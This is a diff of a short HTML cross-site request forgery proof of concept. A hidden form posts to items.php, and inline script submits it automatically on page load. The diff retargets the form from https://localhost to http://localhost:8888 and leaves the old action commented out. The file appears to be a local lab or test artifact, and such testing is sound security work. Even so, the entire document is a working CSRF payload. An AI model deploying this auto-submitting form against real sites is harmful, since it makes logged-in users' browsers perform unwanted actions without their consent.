@@ -1,8 +1,10 @@
 <!DOCTYPE html>
-<html><body>
-  <form name="csrf_form" action="https://localhost/items.php" method="POST">
-    <input type="hidden" name="1" keys="1" value="1">
-  </form>
-
-  <script type="text/javascript">document.csrf_form.submit();</script>
+<html>
+  <body>
+    <!--    <form name="csrf_form" action="https://localhost/items.php" method="POST"> -->
+    <form name="csrf_form" action="http://localhost:8888/items.php" method="POST">
+      <input type="hidden" name="1" keys="1" value="1">
+    </form>
+    
+    <script type="text/javascript">document.csrf_form.submit();</script>
 </body></html>
